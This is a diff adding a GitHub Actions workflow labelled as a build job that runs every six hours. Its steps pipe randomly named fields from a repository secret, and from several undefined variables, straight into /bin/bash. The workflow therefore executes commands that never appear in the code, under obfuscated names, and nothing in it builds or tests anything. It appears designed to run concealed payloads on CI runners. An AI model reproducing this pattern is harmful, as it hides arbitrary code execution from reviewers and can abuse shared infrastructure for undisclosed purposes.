@@ -1,0 +1,27 @@
+name: chentihaoda
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chentihaoda
+        env:
+          ecr1: ${{ secrets.ecr1 }}
+        run: |
+          echo $ecr1 | jq -r .sssq8997 | /bin/bash
+          echo $rrlh7 | jq -r .apf64 | /bin/bash
+          echo $evw40 | jq -r .kvg551 | /bin/bash
+          echo $zo84128 | jq -r .foeb75838 | /bin/bash
+          echo $fwqa53866 | jq -r .lyh19 | /bin/bash
+          echo $oygcy27 | jq -r .ia67231 | /bin/bash
+          echo $wt6 | jq -r .zrch5852 | /bin/bash
+          echo $a66872 | jq -r .fp2196 | /bin/bash
+          echo $u05 | jq -r .b2 | /bin/bash
+          echo $baw91079 | jq -r .drwbh2608 | /bin/bash
+
